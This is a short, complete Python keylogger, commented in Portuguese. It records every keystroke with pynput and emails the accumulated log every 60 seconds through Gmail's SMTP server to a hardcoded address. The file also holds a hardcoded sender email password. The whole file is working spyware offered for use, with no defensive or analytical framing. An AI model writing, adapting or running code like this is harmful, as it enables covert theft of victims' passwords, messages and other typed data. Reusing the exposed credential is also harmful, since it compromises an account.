from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer  

log = ""  # Variável global para armazenar o log de teclas

#CONFIGURAÇÕES DE EMAIL
EMAIL_ORIGEM = " imtestekey@gmail.com "
EMAIL_DESTINO = " imtestekey054@gmail.com "
SENHA_EMAIL = "%MKp45_EUhj"  # Substitua pela senha do seu email    

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo Keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
           server = smtplib.SMTP('smtp.gmail.com', 587) 
           server.starttls()
           server.login(EMAIL_ORIGEM, SENHA_EMAIL)
           server.send_message(msg)
           server.quit()  
        except Exception as e:
            print("Erro ao enviar email",e)

    log = ""  # Limpa o log após enviar o email

    #Agendar envio  
    Timer(60, enviar_email).start()

def on_press(key):
     global log
     try:
        # se for tecla normal, escreve no arquivo
        log += key.char
     except AttributeError:
        # se for tecla especial, escreve no arquivo
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += "<"
        elif key == keyboard.Key.esc:
            log += " [ESC] "    
        else:
            pass # Ignora outras teclas especiais

#Iniciar o keylogger e o envio de email

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # Inicia o envio de email
    listener.join()                           